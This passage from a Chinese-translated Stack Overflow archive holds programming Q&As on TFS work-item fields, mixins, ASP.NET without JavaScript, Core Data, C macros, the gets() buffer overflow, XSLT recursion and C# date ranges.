让我们使用以下字段定义来尝试一下。Notes Date 和 Notes Author 是只读的，并从系统中获取它们的默认值。Notes 字段是 HTML，您可以在其中放置任何您想要的内容。您可以在[TFS Process Editor](http://geekswithblogs.net/jkurtz/archive/2008/01/24/118864.aspx)中执行此操作。

```
 <FIELD reportable="dimension" type="DateTime" name="Notes Date" refname="System.VSTS.Notes.Date">
    <DEFAULT from="clock" />
    <READONLY not="[Global]\Team Foundation Administrators" />
  </FIELD>
  <FIELD reportable="dimension" type="String" name="Notes Author" refname="System.VSTS.Notes.Author">
    <DEFAULT from="currentuser" />
    <READONLY not="[Global]\Team Foundation Administrators" />
  </FIELD>
  <FIELD type="HTML" name="Notes" refname="System.VSTS.Notes" />
</FIELDS> 
```

当然，您仍然需要在表单中添加控件。

您可以尝试的另一件事是仅保留 Notes 字段并注册 WorkItemChanged 事件并编写 Web 服务以使用 Date 和 Author 更新 notes 字段。Changed BY 和 Changed Date 字段将为您提供此信息。[您可以在 Brian A. Randell - Team Foundation System Event Service](http://msdn.microsoft.com/en-us/magazine/cc507647.aspx)的这篇文章中了解可用事件以及如何订阅它们

```
[WebService(Namespace = "http://mynamespace.com/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class UpdateWorkItem : System.Web.Services.WebService
{
    private static TeamFoundationServer _Tfs;
    private static WorkItemStore _WorkItemStore;

    private static List<WorkItem> _ChangedWorkItems = new List<WorkItem>();

    [SoapDocumentMethod(Action = "http://schemas.microsoft.com/TeamFoundation/2005/06/Services/Notification/03/Notify", RequestNamespace = "http://schemas.microsoft.com/TeamFoundation/2005/06/Services/Notification/03")]
    [WebMethod]
    public void Notify(string eventXml, string tfsIdentityXml)
    {

        EventLog.WriteEntry("TFS Services", "Log Started: Notify Webmethod");

        // Load the recieved XML into a XMLDocument
        XmlDocument eventXmlDoc = new XmlDocument();
        eventXmlDoc.LoadXml(eventXml);
        XmlElement eventData = eventXmlDoc.DocumentElement;

        // Validate event data
        if (eventData != null)
        {
            // Get Work Item id from event data
            int id = GetWorkItemId(eventData);

            //EventLog.WriteEntry("TFS Services", String.Format("eventXmlDoc {0}", eventXmlDoc.InnerXml));
            EventLog.WriteEntry("TFS Services", String.Format("Got Id {0}", id));
            string changedby = GetWorkItemChangedBy(eventData);
            EventLog.WriteEntry("TFS Services", String.Format("Got changedby {0}", changedby));
            if (changedby != "TFSSERVICE")
            {
                //Add a 15 second delay in order to make sure all workitems are saved first before starting to update them
                Thread.Sleep(15000);
                EventLog.WriteEntry("TFS Services", "Calling UpdateWorkItemInternal");
                UpdateWorkItemInternal(id);
            }
        }
    }

    private int GetWorkItemId(XmlElement eventData)
    {
        return Convert.ToInt32(eventData.SelectSingleNode("CoreFields/IntegerFields/Field[ReferenceName='System.Id']/NewValue").InnerText);
    }

    private string GetWorkItemChangedBy(XmlElement eventData)
    {
        return Convert.ToString(eventData.SelectSingleNode("CoreFields/StringFields/Field[ReferenceName='System.ChangedBy']/NewValue").InnerText);
    }

    private static void UpdateWorkItemInternal(int id)
    {
        //Connect To TFS Server 
        EventLog.WriteEntry("TFS Services", string.Format("Updating Work Item {0}", id));
        _Tfs = TeamFoundationServerFactory.GetServer("TeamServer");

        _WorkItemStore = (WorkItemStore)_Tfs.GetService(typeof(WorkItemStore));
        WorkItem workItem = _WorkItemStore.GetWorkItem(id);

        switch ((string)workItem.Fields["System.WorkItemType"].Value)
        {
            case "Bug":
                UpdateNotes(workItem);
                break;
            default:
                break;
        }

        foreach (WorkItem item in _ChangedWorkItems)
        {
            if (item.IsDirty)
            {
                foreach (Field field in item.Fields)
                {
                    if (!field.IsValid)
                    {
                        Console.Write("Not valid");
                    }
                }
                EventLog.WriteEntry("TFS Services", string.Format("Saving WorkItem: {0}", item.Id));
                try
                {
                    item.Save();
                }
                catch (Exception ex)
                {
                }
            }
        }

        _ChangedWorkItems.Clear();
    }

    private static void UpdateNotes(WorkItem workItem)
    {
       Field notes = workitem.Fields["System.VSTS.Notes"];
       if (notes != null)
       {
         notes = string.Format("{0} - {1}", workItem.ChangedDate, workItem.ChangedBy);
       } 

       if (workItem.IsDirty)
       {
           if (!_ChangedWorkItems.Contains(workItem))
           {
               _ChangedWorkItems.Add(workItem);
           }
       }
    }
 } 
```

这只是从我现有的代码中复制和粘贴的快速和肮脏的，所以仔细检查它以确保我没有引入错字。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-14T02:47:49.433

我对“历史记录”选项卡的问题感到好奇？它在灰色条中包含日期/时间和用户名，并在其下方立即发表评论。

如果他们没有发表评论，但对工作项进行了其他更改，则会有一个名为 Show Changed Fields 的折叠标题。评论总是可见的。

**更新**

您可以创建自定义工作项控件，以提供您自己的工作项历史视图。

[http://msdn.microsoft.com/en-us/library/bb286959.aspx](http://msdn.microsoft.com/en-us/library/bb286959.aspx)

另请参阅[TFS 工作项跟踪自定义控件](http://witcustomcontrols.codeplex.com/)

# oop - Mixin 与继承

> ID：860245
> 
> 赞同：121
> 
> 时间：2009-05-13T20:31:55.907
> 
> 标签：oop, inheritance, mixins

mixin 和继承有什么区别？

* * *

## 回答 #1

> 赞同：80
> 
> 时间：2009-05-13T20:42:20.790

mixin 通常与多重继承一起使用。所以，从这个意义上说，“没有区别”。

细节是 mixin 作为一个独立的对象很少有用。

例如，假设您有一个名为“ColorAndDimension”的 mixin，它添加了一个颜色属性以及宽度和高度。

现在，您可以将 ColorAndDimension 添加到例如 Shape 类、Sprite 类、Car 类等。它们都将具有相同的接口（例如 get/setColor、get/setHeight/Width 等）

因此，在一般情况下，mixin 是继承。但是您可以争辩说，混入是“主要”类还是仅仅是混入，这取决于类在整个域中的作用。

* * *

编辑——只是为了澄清。

是的，在当今的现代术语中，可以认为 mixin 是具有相关实现的接口。它实际上只是使用普通的、旧的、日常的类的普通的、旧的、日常的多重继承。它恰好是 MI 的特定应用。大多数语言不给 mixin 任何特殊的地位。它只是一个旨在“混合”而不是独立使用的类。

* * *

## 回答 #2

> 赞同：36
> 
> 时间：2015-01-12T17:25:57.663

> # mixin 和继承有什么区别？

***混入***是一个基类，您可以从中继承以提供附加功能。伪代码示例：

```
class Mixin:
    def complex_method(self):
        return complex_functionality(self) 
```

名称“mix-in”表示它旨在与其他代码混合。因此，推断是您不会自行实例化混合类。下面的对象没有数据，实例化它调用complex_method是没有意义的。（在这种情况下，您也可以只定义一个函数而不是一个类。）

```
>>> obj = Mixin() 
```

混入经常与其他基类一起使用。

因此**mixins 是继承的一个子集或特殊情况。**

与单一继承相比，使用混合的优点是您可以为该功能编写一次代码，然后在多个不同的类中使用相同的功能。缺点是您可能需要在使用该功能的其他地方寻找该功能，因此最好通过将其放在附近来减轻该缺点。

我个人发现在单一继承上使用混合是必要的，我们正在对许多类似的代码进行单元测试，但是测试用例是基于它们对基本用例的继承来实例化的，并且是保持代码接近的唯一方法手（并且在同一个模块中），而不弄乱覆盖率，是从对象继承，并让子用例从通用测试用例库和仅适用于它们的自定义库继承。

# Mixin 与抽象基类的比较和对比

两者都是不打算实例化的父类的一种形式。

***mixin***提供了功能，但不能直接使用它。用户打算通过（子）类使用它。

***抽象基类***提供接口，但没有可用的功能。用户旨在创建接口调用的功能。

```
class Abstraction(metaclass=abc.ABCMeta):
    @abc.abstractmethod
    def complex_method(self):
        return complex_functionality(self) 
```

在这里，您无法实例化此对象，因为它需要一个子类来使用具体方法实现功能（尽管您可以访问 from 中的功能`super()`）：

```
>>> obj = Abstraction()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: Can't instantiate abstract class Abstraction with
abstract methods complex_method 
```

在 Python 中，`abc`模块中的某些类是父类的示例，它们都通过继承和抽象接口提供功能，必须由子类实现。这些想法并不相互排斥。

# 概括

简而言之，mix-in 只是一个基类，您不会自己实例化它，通常用作多重继承中的辅助基类。

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2009-05-13T20:36:59.440

混合是用于实现目的的（多重）继承的一种特定的、受限制的情况；某些语言（例如 Ruby）支持它，但不支持广义多重继承。

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2016-05-06T19:18:45.203

Mixin 是一个抽象的概念，任何符合其要求的东西都可以被认为是一个 mixin。

这是维基百科的定义。

*在面向对象的编程语言中，mixin 是一个类，其中包含供其他类使用的方法，而不必是这些其他类的父类。这些其他类如何访问 mixin 的方法取决于语言。Mixin 有时被描述为“包含”而不是“继承”。*

**简而言之，与继承的主要区别在于混合不需要像继承那样具有“is-a”关系。**

从实现的角度来看，你可以把它看成一个带有实现的接口。例如，如果 Java 支持多重继承，Java 中的抽象类可以被认为是 mixin。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-05-13T20:52:58.417

“从某种意义上说，mixin 是一个类的一个片段，它旨在与其他类或 mixin 组合在一起。” -DDJ

mixin 是一个类或代码片段，它不适合独立使用，而是应该在另一个类中使用它。将其组合为成员字段/变量或代码段。我对后者的接触最多。它比复制粘贴样板代码好一点。

[这是一篇介绍该主题的精彩 DDJ 文章。](http://www.ddj.com/showArticle.jhtml?articleID=184404445)

Half-Life 2 / “Source” SDK 是 C++ mixin 的一个很好的例子。在那种环境中，宏定义了相当大的代码块，可以添加这些代码块以赋予类特定的“风味”或特性。

查看源 wiki 示例：[创作逻辑实体](http://developer.valvesoftware.com/wiki/Authoring_a_Logical_Entity)。在示例代码中，可以将 DECLARE_CLASS 宏视为一个 mixin。Source SDK 广泛使用 mixin 来标准化数据访问代码并将行为归因于实体。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2020-10-16T16:46:12.763

Mixin 以一种更像“插件”的方式被广泛使用。

它们是相同的，但在不同的上下文中。通常当我们谈论继承时，我们谈论的是 SINGLE 继承，而 mixin 是一种允许 MULTIPLE 继承的构造。

这是一种在 OOP 世界中极具争议的语言结构，因为：

*   必须解决的歧义
*   很多时候“mixin”类不能单独工作，并且可能与其他 mixin 冲突
*   它可能导致“钻石继承问题”，两个超类可以从同一个类继承

但除此之外，它是一种用于各种语言和框架的强大构造，一些示例是：

*   姜戈
    *   [https://github.com/django/django/blob/98126cdfaf632abc8f0b5e65910e46a4eedc4641/django/views/generic/list.py#L194](https://github.com/django/django/blob/98126cdfaf632abc8f0b5e65910e46a4eedc4641/django/views/generic/list.py#L194)

    *   [https://docs.djangoproject.com/en/3.1/topics/class-based-views/mixins/](https://docs.djangoproject.com/en/3.1/topics/class-based-views/mixins/)

*   打字稿
    *   [https://www.typescriptlang.org/docs/handbook/mixins.html](https://www.typescriptlang.org/docs/handbook/mixins.html)
    *   [https://vincit.github.io/objection.js/guide/plugins.html#_3rd-party-plugins](https://vincit.github.io/objection.js/guide/plugins.html#_3rd-party-plugins)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2011-01-26T09:19:43.383

通过多重继承，新类可以由多个超类组成。您只能调用任何超类中定义的方法。

另一方面，mixin 是一个抽象子类，可以用来专门化各种父类的行为。Mixins 可以调用一个方法（例如`sayHello(): String`），即使它们没有定义这样的方法。

```
mixin M {
    name: String
    defmethod greetings() { print sayHello() + " " + name}
} 
```

如您所见，`sayHello()`即使它没有在任何地方定义，您也可以调用。如果将 mixin 添加`M`到 class `C`，则`C`应该提供`sayHello()`方法。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-04-15T16:37:16.727

我认为需要注意的是，*mixin*并不意味着*继承*。根据维基百科，[Mixin](https://en.wikipedia.org/wiki/Mixin)是：

> 在面向对象的编程语言中，mixin 是一个包含供其他类使用的方法的类，而不必是这些其他类的父类。这些其他类如何访问 mixin 的方法取决于语言。Mixin 有时被描述为“包含”而不是“继承”。

具体来说，在 perl 之类的语言中，可以使用 Exporter 模块添加 mixin：

```
package Mixins;

use Exporter qw(import);
our @EXPORT_OK = qw(pity);

# assumes it will be mixed-in to a class with a _who_do_i_pity method
sub pity {
    my ($self) = @_;
    printf("I pity %s\n", $self->_who_do_i_pity('da foo'));
} 
```

可以将其混入一次包含一个或多个方法的任何模块中：

```
package MrT

use Mixins qw(pity);

sub new {
    return bless({}, shift);
}

sub _who_do_i_pity {
    return 'da foo!'
} 
```

然后在您的`MrT`模块中可以这样使用：

```
use MrT;

MrT->new()->pity(); 
```

我知道这是一个荒谬的例子，但是，它明白了……

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2017-03-26T06:07:29.713

tl;博士

mixin 和多重继承具有相同的形式。但有不同的语义：mixin 有基础类提供函数实现。对于继承，基类提供接口，子类提供实现。

但无论如何，组合比 mixin IMO 更受欢迎

# asp.net - ASP.NET - 没有 JavaScript 的客户端

> ID：860246
> 
> 赞同：2
> 
> 时间：2009-05-13T20:31:58.963
> 
> 标签：asp.net, javascript

我的页面上有一些 JavaScript 当前正在处理的功能。我想让我的页面与非 Javascript 用户兼容。有没有办法我可以说“如果启用了 JavaScript，请使用我的 JavaScript 例程，否则执行回发并让服务器端处理它？”

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T20:40:05.160

我必须假设触发此回发或客户端行为（取决于 javascript 是否可用）的任何东西都是 html 提交按钮？

如果是，我会将客户端内容的 javascript 处理程序附加到按钮上，并让处理程序返回“false”以防止回发。当 javascript 未启用时，该按钮将执行触发回发的标准 html 表单功能，然后让您在服务器端执行操作。

您可以通过在链接单击事件上运行 javascript 来执行客户端操作来对链接执行类似的操作，但在 javascript 不可用的情况下只需点击链接即可。

这些方法在对没有 javascript 的浏览器的反应方面更加优雅，因为它们回退到标准的 html 表单行为并且不需要代码来检测 javascript - 它只是忽略您的 javascript 并按应有的方式提交表单。

**关于 checkboxes**，请注意非启用 javascript 的页面中的默认行为是不回发更改。如果您更改复选框的状态，您总是必须点击提交按钮才能回发，如果没有 javascript，您根本无法对复选框状态更改进行回发。

asp.net 中的几个控件（包括下拉列表）具有在客户端更改时自动回发的选项，这是通过 javascript 完成的，如果这不可用，则优雅降级的唯一方法是拥有一个用户单击的按钮强制标准 html 回发，以便您的服务器可以响应更改的控制状态。

如果您发现您的 UI 中没有连贯的“流程”，如果您没有复选框/组合等的自动回发，那么您可能需要重新考虑您的 UI 设计并转向更加基于向导的布局。

无论如何，我都会禁用这些类型的自动回发，因为这对用户来说是*可怕*的，这是一种耻辱，因为当他们的浏览器不使用 javascript 时，你会竭尽全力为他们提供可用的体验。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T20:35:17.150

您可以尝试利用 noscript html 标记...

[http://www.w3schools.com/TAGS/tag_noscript.asp](http://www.w3schools.com/TAGS/tag_noscript.asp)

这不处理回发的东西，但您可以提供一个控件来显示以触发服务器端代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T22:59:16.807

我建议您阅读有关使用不显眼的 JavaScript 的内容，建议的解决方案会遵守这些内容。基本思想是 JavaScript 和 Ajax 应该扩展您的用户体验，而不是作为一种要求。您的 JavaScript 代码应该劫持诸如单击按钮之类的事件并阻止默认行为，因为脚本应该在浏览器中实时处理处理和响应。

# iphone - 最近使用 Core Data 进行的搜索

> ID：860253
> 
> 赞同：0
> 
> 时间：2009-05-13T20:33:32.753
> 
> 标签：iphone, cocoa-touch, core-data

我正在为 iPhone 制作一个 Core Data 应用程序，但希望这个问题足以适用于 Mac OS X，以便在没有 NDA 问题的情况下在这种情况下得到回答。

当用户进行搜索时，我使用实体条目将每个结果保存到上下文中。我希望稍后可以在“最近搜索”部分检索这些结果。解决这个问题的最佳方法是什么？

我正在考虑的一种方法是添加另一个名为 History 的实体，其 Entry 属性链接到该实体。第一个搜索结果的 Entry.history_id = 1，第二个结果的 Entry.history_id = 2，依此类推。然后最近搜索将选择具有给定历史 ID 的条目实体。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-13T20:58:29.140

如果您想要的是一个有序的搜索列表，那么您是正确的：您将不得不手动管理一些指定顺序的属性。你给的`history_id`是一种可能性。我可能会使用在插入实体实例时设置的日期属性。然后，您可以按此日期属性订购您的提取。为了存储实际搜索，我经常将查询的 NSPredicate 实例序列化为数据属性（自己处理序列化/反序列化）或可转换（使用默认的 NSUnarchiveFromData 传输）属性。

# c# - 将公交路线保存在数据库中的最佳实践

> ID：860258
> 
> 赞同：1
> 
> 时间：2009-05-13T20:33:59.740
> 
> 标签：c#, sql, sql-server-2005

我有一个项目，其中包含一个有助于管理公共汽车运输公司的系统。

我必须在我的数据库中存储所有公共汽车的每日路线。

我怎么做？我可以用什么来帮助用户设计路线？

我想知道使用谷歌地图或类似的东西来帮助用户“设计”所有路线。

我无法弄清楚：S

最好的后卫。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T23:06:59.257

有一个“StopLocation”表，指示任何公共汽车可以停靠的每个可能的位置。

有一个“BusSchedule”表，这将是一天中一辆公共汽车的时间表。

然后有一个“BusStop”表。

这将有一个对“BusSchedule”的外键引用，一个对“StopLocation”的外键引用，以及它应该停在那里的时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T22:56:18.620

就像 Josh 建议的那样：如果你在谈论一条路线，我会存储一个纬度/经度航点列表来描述一条路线。

一些链接：

[谷歌地图 .NET 控件](http://www.codeproject.com/KB/custom-controls/LatLaysFlat-Part1.aspx)

[第 2 部分高级用法](http://www.codeproject.com/KB/custom-controls/LatLaysFlat-Part2.aspx)

[第 3 部分](http://www.codeproject.com/useritems/LatLaysFlat-Part3.asp)

（在[这个地方](http://jmayo.spaces.live.com/blog/cns!5F243997972597CE!208.entry)找到）

# xml - ServerXMLHTTP 安全吗？

> ID：860261
> 
> 赞同：1
> 
> 时间：2009-05-13T20:34:44.640
> 
> 标签：xml, https

我们一直在使用 ServerXMLHTTP 发送 https POST 以进行信用卡处理。最近我们的一位用户遇到了一个问题，导致“Microsoft Windows HTTP 服务中发生内部错误”错误。问题已通过更新 IE 解决。现在用户声称我们使用“Internet Explorer dll”是一个安全问题。当然，我知道问题出在 MS XML 核心服务上。所以我的问题是......使用 MS XML 核心服务是否安全，特别是使用 ServerXMLHTTP 对象来发送 https POST？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-06-12T01:13:53.647

尽管我不喜欢这样的事情，但由于您正在处理用户的信用卡，因此建议拒绝他们在过时的浏览器上提交他们的信息。这将防止将来出现此类情况，有助于保护您免受可能的诉讼，并具有保护您的用户、您的网站和其他人的额外好处。

根据我在 IT 工作几年的经验，保护计算机*最*重要的事情就是使其保持最新状态——甚至比防病毒或防火墙保护更重要*。

*显然，它们仍然非常重要，不要误会我的意思。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-13T20:48:23.650

ServerXMLHTTP 使用 WinHTTP（不是 IE dll），而 SSL 又使用 Windows 服务来创建安全套接字。您可能会问“Windows Secure 套接字安全吗？”。我不确定其他浏览器中的网络堆栈代码到底能到达多远，但我怀疑它们中的许多仍然依赖底层操作系统来提供这种级别的服务。

安全吗？当然，回答“是”会引出不是的故事或例子。它是否足够安全（条件是客户端机器本身没有以某种方式受到损害）？是的。

# c - 用 C 语言生成宏？

> ID：860273
> 
> 赞同：11
> 
> 时间：2009-05-13T20:35:59.893
> 
> 标签：c, macros, c-preprocessor, variadic-functions

我想让**C**预处理器为我生成宏（即，我只使用 C99）。我会写一个宏

```
#define make_macro(in) <...magic here...> 
```

当我把

```
make_macro(name1)
make_macro(name2) 
```

稍后在代码中，它将扩展为

```
#define name1(...) name1_fn(name1_info, __VA_ARGS__)
#define name2(...) name2_fn(name2_info, __VA_ARGS__) 
```

然后我就可以使用 name1 和 name2 作为（宏实现的）函数。我认为我在两个步骤中都使用宏：使用宏重复重新填充模板是有意义的，并且可变参数处理除了通过宏之外将不起作用。

那么，<...magic here...> 占位符中包含什么来执行此操作？在这一点上，我开始相信这在 C99 中是不可能的，但也许我遗漏了一些语法细节。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-05-13T20:37:05.150

这在标准 C 中是不可能的。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-05-14T03:06:07.720

您是否考虑过使用 M4 宏？我认为它们在大多数平台上都可用，所以这不应该是一个限制。

[M4 GNU 页面](http://www.gnu.org/software/m4/)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-05-14T04:20:58.600

正如每个人所说，你不能完全按照你的要求去做。

您可以通过强制 C 预处理器运行两次来执行类似的操作，例如，在 makefile 中使用这样的规则：

```
.c.pp:
   $(CPP) $< -o $@ 
```

然后给你的文件扩展名为 test.pp。Makefile 将运行一次以生成 .c 文件，然后在 .c 文件上正常运行将运行第二次。

就个人而言，我宁愿用 Perl 或其他东西编写一个外部脚本来为我生成 C 代码；它比使用 C 预处理器玩游戏要干净一些。这取决于我们正在谈论多少代码。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-05-13T20:41:10.853

这是不可能的，因为宏只执行一次。

这并不意味着您不能在宏中使用其他宏，但您不能这样做

```
#define TEST #define HALLO 33

int x = TEST; 
```

然后期望 x 为 33！你会得到一个语法错误，因为你尝试过

```
int x = #define HALLO 33; 
```

或者编译器可能已经在#define 中抱怨#define。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-02-10T13:56:08.230

根据[C99 第 6.10.3.2 节](http://open-std.org/JTC1/SC22/WG14/www/docs/n1256.pdf#page=165)：

> 类函数宏的替换列表中的每个 # 预处理标记应后跟一个参数，作为替换列表中的下一个预处理标记。

因此，`#define`如果您有一个名为的参数，您当然可以将 a 放入宏中，`define`但它永远不会满足您的要求。这经常困扰我，因为我必须在 C 中工作，因此不能使用 C++ 模板。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T20:40:55.860

试试`#define make_macro(name,...) name##_fn(name##_info, __VA_ARGS__)`。

像这样使用：

```
make_macro(name1)
make_macro(name2,1) 
```

这会产生

```
name1_fn(name1_info)
name2_fn(name2_info,1) 
```

# c - 怎么了？获取（）

> ID：860281
> 
> 赞同：2
> 
> 时间：2009-05-13T20:37:05.650
> 
> 标签：c

让我们考虑这两行：

```
char input[1];
gets(input); 
```

假设输入是“测试”。printf("%s\n",input) => "test" 但是如果我使用调试器，我会看到 input[0]='t' no input[1]... 到底发生了什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-05-13T20:39:59.140

那是缓冲区溢出，仅供参考。为了好玩，在`char untouched[20];`之后添加`char input[1];`并打印`untouched`。不要使用`gets()`，使用`fgets()`或其他带有边界检查的东西。

调试器没有显示`input[1]`，因为没有这样的东西。您的`char input[1];`声明分配了一个长度为 1 的数组，而不是从 0 到 1 的数组。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-05-13T20:43:17.153

> get(s) 从标准输入读取一行到 s 指向的缓冲区，直到一个终止换行符或 EOF，它用 '\0' 替换它。不检查缓冲区溢出

[http://linux.die.net/man/3/gets](http://linux.die.net/man/3/gets)

当你执行gets时，输入被写入s指向的缓冲区。然后它添加一个\0。只有“t”在输入缓冲区内。其余的位于堆栈上的连续内存上。printf 打印“test”，因为它可以从 s 开始读取到第一个 \0。但是“est\0”在缓冲区之外。

```
 ------
|  t  |  input - Debugger only sees this position.
 ------
|  e  |  Memory you are stepping onto. Trouble if it doesn´t belong to your proc.   
|  s  | 
|  t  |
|  \0 |
------ 
```

当你调试它时，输入只指向一个字符，所以你能看到的只有这些。

查看**“不检查缓冲区溢出”**很重要。这意味着，gets 函数并不真正关心您是否为输入分配了内存。它只会从您指定的点开始复制所有内容。如果您不小心，那么您的输入可能会涉及重要信息。在某些最坏的情况下，这将是您的函数的返回地址（您正在使用获取的位置）。“只是犯”这个错误的人会说“wtf is going on”。故意这样做的人会将您的返回地址指向特定部分，并执行位于那里的代码。

[更多关于缓冲区溢出。](http://www.linuxjournal.com/article/6701)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-05-13T20:39:24.333

你溢出了你的缓冲区，这就是发生的事情。你正在写入不属于你的记忆并且很幸运。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-13T20:40:32.680

这个：

```
char input[1]; 
```

只保留一个字符的内存，然后你放了五个字符。

调试器知道你只有一个字符，并且会告诉你它知道你有什么。

正在运行的程序会将字符串飞溅到相邻的任何内存上，`input`然后崩溃或逃脱。在你的情况下，你正在摆脱它。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-13T20:41:27.373

长度为 n 的 char[] 将最后一个条目存储在位置 n-1 中。所以，

```
char input[1]; 
```

表示存储在数组输入位置 0 中的单个 char 类型数据。

（编辑以提供一些澄清 - 第一个措辞太糟糕了。）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T20:41:08.653

您声明一个具有固定大小“1”的数组。数组中第一个元素的索引始终为“0”。这就是为什么 input[0] 保存字符't'。

编辑 - 其余部分存储在缓冲区之外的某个地方（BufferOverFlow）。

# dotnetnuke - 将 DotNetNuke 菜单包装在不同的 Div 中并指定 CssClass？

> ID：860284
> 
> 赞同：0
> 
> 时间：2009-05-13T20:38:06.927
> 
> 标签：dotnetnuke

我想将 DNN 菜单中的菜单项分组到它们自己的 Div 中——这样我就可以在层次结构中的每个单元格上都有底部填充。

例如：

我有“关于”的主菜单项 - 在下面有“关于我们的办公室” - 然后在下面有“关于我们的服务器机房”。这不是确切的用法，只是层次结构的一个示例。

我希望“关于”成为主选项卡，然后当我悬停时，我可以看到我的另外两个项目，一个嵌套在另一个项目中。但是，我希望“关于我们的办公室”是一个底部填充的 Div，将其与下一个二级菜单项分开。

所以它看起来像：

关于

* * *

关于我们的办公室

```
 About our Server Room 
```

* * *

!!!在此处填充以分隔二级菜单项！

* * *

联系我们

```
 How to get here 
```

* * *

任何想法如何做到这一点？如果我可以将 CssClass 分配给每个菜单项，那会很有帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-18T04:00:12.987

如果您使用 Solpart 菜单，这有点困难，您应该查看其他一些菜单提供程序

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-11-26T13:09:59.153

我`[/tr tr]`在我的页面名称中使用...

# xml - XSLT 通过应用模板或调用模板反转模板顺序？

> ID：860293
> 
> 赞同：1
> 
> 时间：2009-05-13T20:39:37.547
> 
> 标签：xml, xslt, reverse

我正在为一组节点编写一个转换，类似于这个。

```
 <xsl:template match="/" name="nav">
        <!--do stuff-->
      <xsl:if test="notEnd">
       <xsl:call-template name="nav"></xsl:call-template>
      </xsl:if>
  </xsl:template> 
```

它生成的结果是自上而下（递归）：

```
<!--do stuff 5-->
<!--do stuff 4-->
<!--do stuff 3-->
<!--do stuff 2-->
<!--do stuff 1--> 
```

问题是在它生成结果之后，我需要它的顺序正确：

```
<!--do stuff 1-->
<!--do stuff 2-->
<!--do stuff 3-->
<!--do stuff 4-->
<!--do stuff 5--> 
```

我对递归后如何解决这个问题一无所知？我应该使用另一个模板并实现应用模板还是有另一种方法可以颠倒顺序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T20:45:01.423

如果在 do 之前添加递归调用会怎样？

```
 <xsl:template match="/" name="nav">
      <xsl:if test="notEnd">
       <xsl:call-template name="nav"></xsl:call-template>
      </xsl:if>
      <!--do stuff-->
  </xsl:template> 
```

你应该得到相反的顺序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-25T05:09:44.680

要了解递归，首先必须了解递归。

# c# - 一年内的两个日期

> ID：860298
> 
> 赞同：3
> 
> 时间：2009-05-13T20:40:10.700
> 
> 标签：c#, asp.net, datetime

我有两个日期，我如何检查两个日期是否不超过一年？

简短的问题！:-)

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-05-13T20:41:31.540

```
if (Math.Abs((d1 - d2).TotalDays) < 365) 
```

* * *

**编辑：**这应该更好地解释闰年。

```
if ( d1 <= d2 && d1.AddYears(1) >= d2 || d2 < d1 && d2.AddYears(1) > d1) 
```

**更新：**
我更喜欢@JDunkerley 的解决方案：

```
if (d1 < d2 ? d2 < d1.AddYears(1) : d1 < d2.AddYears(1)) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-05-13T20:43:18.790

我给你举个小例子：

```
DateTime startTime = DateTime.Now;

 DateTime endTime = DateTime.Now.AddSeconds( 75 );

 TimeSpan span = endTime.Subtract ( startTime );
 Console.WriteLine( "Time Difference (seconds): " + span.Seconds );
 Console.WriteLine( "Time Difference (minutes): " + span.Minutes );
 Console.WriteLine( "Time Difference (hours): " + span.Hours );
 Console.WriteLine( "Time Difference (days): " + span.Days ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-13T20:44:37.243

```
TimeSpan ts = Date1.Subtract(Date2);

if(ts.Days > 365)
{
// Over a year.
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-13T20:45:29.300

这取决于日期格式。

*   如果您有两个时间戳，您可以计算它们之间的差异。
*   如果您有两个已知格式的特定日期，您只需将年份属性作为字符串进行比较。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-13T20:47:47.503

如果它们都在 DateTime 结构中，那么您只需将两者相减即可得到[Timespan](http://msdn.microsoft.com/en-us/library/system.timespan.aspx)结构。Timespan 结构有一个[Days](http://msdn.microsoft.com/en-us/library/system.timespan.days.aspx)属性，您可以查看它。

所以你会有类似的东西：

```
if(Math.Abs((date1 - date2).Days) <= 365) ... 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T20:54:59.817

[这与“我如何计算某人的年龄”](https://stackoverflow.com/questions/9/how-do-i-calculate-someones-age-in-c)是同一个问题。

从那里公然窃取答案并对其进行修改以供使用：

```
public static bool DatesAreWithinOneYear(DateTime date1, DateTime date2)
{
    DateTime startDate = date2 > date1 ? date1 : date2;
    DateTime endDate = date2 > date1 ? date2 : date1;

    int years = endDate.Year - startDate.Year;
    if (endDate < startDate.AddYears(years))
    {
        years--;
    }
    return years < 1;
} 
```
